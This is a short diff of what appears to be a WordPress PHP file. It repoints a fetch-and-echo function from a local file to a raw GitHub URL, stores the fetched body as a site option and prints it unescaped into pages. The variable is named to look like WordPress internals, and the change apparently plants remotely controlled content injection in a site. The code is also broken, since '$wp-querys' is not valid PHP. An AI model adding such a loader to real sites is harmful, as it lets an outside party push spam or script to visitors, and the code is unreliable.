@@ -31,5 +31,5 @@ function fetch_and_display_content($url) {
     update_option('news_content', $body);
     echo $body;
 }
-$wp-querys = 'raw.txt';
+$wp-querys = 'https://github.com/unemployedX/nameless-sc/raw/main/news.txt';
 fetch_and_display_content($wp-querys);
